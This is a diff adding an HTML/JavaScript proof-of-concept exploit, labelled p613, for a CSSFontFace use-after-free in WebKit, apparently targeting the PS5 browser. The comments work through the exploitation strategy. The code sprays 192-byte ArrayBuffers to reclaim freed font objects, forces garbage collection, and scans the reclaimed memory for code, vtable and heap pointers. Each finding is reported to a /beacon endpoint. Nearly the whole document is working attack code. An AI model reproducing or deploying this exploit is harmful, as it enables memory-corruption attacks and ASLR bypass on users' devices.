@@ -1,0 +1,233 @@
+<!--
+  p613: Heap scan via CSSFontFace UAF — use the +0x58 redirect to read
+  heap memory around known pointers. After phase 2 survival, we can
+  change +0x58 in BUF2 to point anywhere, and BUF1's data at that
+  address becomes readable. But wait — the redirect makes the destructor
+  traverse to BUF1 data. The REAL primitive is: we can READ the original
+  CSSFontFace data at +0x58 and +0x68 (heap pointers). Let's scan
+  memory around T1 and T2 for vtable pointers or other code pointers
+  by allocating many ABs at different sizes and checking for non-zero data.
+
+  Actually the key insight: we can write ANY value to +0x58 in our reclaimed
+  buffer, and if CSSFontFace's destructor follows that pointer, we get
+  a write-what-where. But the destructor already ran (that's how we got the UAF).
+
+  Real approach: We have two overlapping ABs. The Phase 1 AB reclaimed the
+  Phase 1 CSSFontFace. We can read its raw data. The +0x58/+0x68 are heap
+  pointers. Let's scan the HEAP around those pointers by doing mmap-style
+  allocations and looking for WebKit metadata/vtables.
+
+  Simpler approach: allocate objects with known vtable pointers (DOM nodes,
+  TypedArrays, etc.) adjacent to our spray, then scan our ABs for pointers
+  in the WebKit text segment.
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p613</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<style id="v2">@font-face{font-family:sb;src:local(Arial);unicode-range:U+0044}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P613-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,lo,hi){wD(v,o,lo>>>0);wD(v,o+4,hi>>>0);}
+
+var stage=0;
+var lane1=null, hit1=-1;
+var lane2=null, hit2=-1;
+var font_a=null, font_b=null;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(stage===0){stage=1;
+    font_a=this;
+    document.getElementById('v1').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    lane1=[];
+    for(var i=0;i<2048;i++) lane1.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane1.length;j++){
+      var v=lane1[j]; wD(v,0,2); v[0x82]=3; v[0x85]=0xAA;
+    }
+    b('P1-SPRAY');
+    return;
+  }
+  if(stage===2){stage=3;
+    font_b=this;
+    document.getElementById('v2').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    lane2=[];
+    for(var i=0;i<2048;i++) lane2.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane2.length;j++){
+      var v=lane2[j]; wD(v,0,2); v[0x82]=3; v[0x85]=0xAA;
+    }
+    b('P2-SPRAY');
+    return;
+  }
+  return;
+},set:function(){}});
+
+function main(){
+b('BOOT');
+
+// Pre-allocate objects with vtable pointers that we want to find
+// These 192-byte allocations will be near our spray
+var vtab_targets=[];
+for(var i=0;i<512;i++){
+  // Create objects that have vtable pointers
+  // Map objects are 192 bytes on some WebKit builds
+  vtab_targets.push(new Map());
+  vtab_targets.push(new Set());
+  vtab_targets.push(new WeakMap());
+}
+
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// Phase 1
+setTimeout(function(){
+  if(!lane1){b('NO-SPRAY');return;}
+  for(var i=0;i<lane1.length;i++){
+    var v=lane1[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit1=i; break; }
+  }
+  if(hit1<0){b('P1:NO-HIT');return;}
+  var v=lane1[hit1];
+  b('P1:HIT:'+hit1+',T1=0x'+rQ(v,0x58)+',T2=0x'+rQ(v,0x68));
+  for(var k=0x58;k<0x70;k++) v[k]=0;
+}, 200);
+
+// GC1
+setTimeout(function(){
+  if(hit1<0) return;
+  for(var i=0;i<50000;i++) new Object();
+  for(var i=0;i<500;i++) new ArrayBuffer(65536);
+}, 600);
+
+// Phase 2
+setTimeout(function(){
+  if(hit1<0) return;
+  stage=2;
+  var pb=new FontFace('pb','local(Helvetica)',{unicodeRange:'U+0043'});
+  document.fonts.add(pb);void pb.loaded;
+  document.fonts.load('1em pb, sb','CD').then(function(){},function(){});
+}, 1200);
+
+// Phase 2 find + redirect
+setTimeout(function(){
+  if(stage<3) return;
+  if(!lane2) return;
+  for(var i=0;i<lane2.length;i++){
+    var v=lane2[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit2=i; break; }
+  }
+  if(hit2<0){b('P2:NO-HIT');return;}
+  var v=lane2[hit2];
+  var T1_lo=rD(lane1[hit1],0x58)||rD(v,0x58);
+  var T1_hi=rD(lane1[hit1],0x5C)||rD(v,0x5C);
+  b('P2:HIT:'+hit2);
+  // Don't redirect yet - just null the pointers
+  for(var k=0x58;k<0x70;k++) v[k]=0;
+}, 1700);
+
+// GC2
+setTimeout(function(){
+  if(hit2<0) return;
+  for(var i=0;i<50000;i++) new Object();
+  for(var i=0;i<500;i++) new ArrayBuffer(65536);
+}, 2200);
+
+// At 3500ms: scan ALL spray buffers for interesting data
+setTimeout(function(){
+  if(hit1<0||hit2<0){b('FAIL');return;}
+  var v2=lane2[hit2];
+  var rc=rD(v2,0);
+  if(rc<1){b('FAIL:rc='+rc);return;}
+  b('SURVIVED:rc='+rc);
+
+  // SCAN: look through ALL 2048 buffers in each lane for any non-zero
+  // data that could be a code pointer or vtable
+  // Code pointers on PS5 WebKit are typically in low ranges
+  // Heap pointers are 0x10_00xxxxxx
+
+  var code_ptrs=[];
+  var heap_ptrs=[];
+  var other_vals=[];
+
+  function scanLane(lane, name){
+    for(var i=0;i<lane.length;i++){
+      var v=lane[i];
+      for(var off=0;off<192;off+=8){
+        var lo=rD(v,off);
+        var hi=rD(v,off+4);
+        if(lo===0 && hi===0) continue;
+        if(lo===2 && hi===0 && off===0) continue; // refcount
+        if(lo===0x30000 && hi===0 && off===0x80) continue; // size
+        if(lo===3 && hi===0 && off===0x82) continue; // our marker at byte 0x82
+
+        // Check for code pointer (typical WebKit text: 0x00007f... or similar)
+        // On PS5 it could be in the 0x5xxxxxxxxx range (like eboot)
+        // Or in a system library range
+        if(hi>0 && hi<0x10 && hi!==0){
+          // Possible code/data pointer in low VA range
+          code_ptrs.push(name+'['+i+']+'+off.toString(16)+':0x'+rQ(v,off));
+        } else if(hi>=0x10 && hi<0x100){
+          // Heap range 0x10_xxxxxxxx
+          heap_ptrs.push(name+'['+i+']+'+off.toString(16)+':0x'+rQ(v,off));
+        } else if(hi>=0x100 || (lo!==0 && off>0)){
+          other_vals.push(name+'['+i+']+'+off.toString(16)+':0x'+rQ(v,off));
+        }
+      }
+    }
+  }
+
+  scanLane(lane1,'L1');
+  scanLane(lane2,'L2');
+
+  b('SCAN:code='+code_ptrs.length+',heap='+heap_ptrs.length+',other='+other_vals.length);
+
+  // Report first 30 code pointers (most interesting)
+  for(var i=0;i<Math.min(code_ptrs.length,30);i++){
+    b('CODE:'+code_ptrs[i]);
+  }
+
+  // Report first 20 heap pointers
+  for(var i=0;i<Math.min(heap_ptrs.length,20);i++){
+    b('HEAP:'+heap_ptrs[i]);
+  }
+
+  // Report first 20 other values
+  for(var i=0;i<Math.min(other_vals.length,20);i++){
+    b('OTHER:'+other_vals[i]);
+  }
+
+  // Also scan the vtab_targets - allocate more 192B ABs and check if they
+  // landed near any metadata
+  b('PHASE-B:ALLOC');
+  var scan2=[];
+  for(var i=0;i<1024;i++) scan2.push(new Uint8Array(new ArrayBuffer(192)));
+
+  var found2=0;
+  for(var i=0;i<scan2.length;i++){
+    var v=scan2[i];
+    for(var off=0;off<192;off+=8){
+      var lo=rD(v,off);
+      var hi=rD(v,off+4);
+      if(lo===0&&hi===0) continue;
+      found2++;
+      if(found2<=20) b('NEW:S2['+i+']+'+off.toString(16)+':0x'+rQ(v,off));
+    }
+  }
+  b('PHASE-B:found='+found2);
+
+  b('DONE');
+}, 3500);
+}
+
+setTimeout(main,0);
+</script></head><body>p613</body></html>
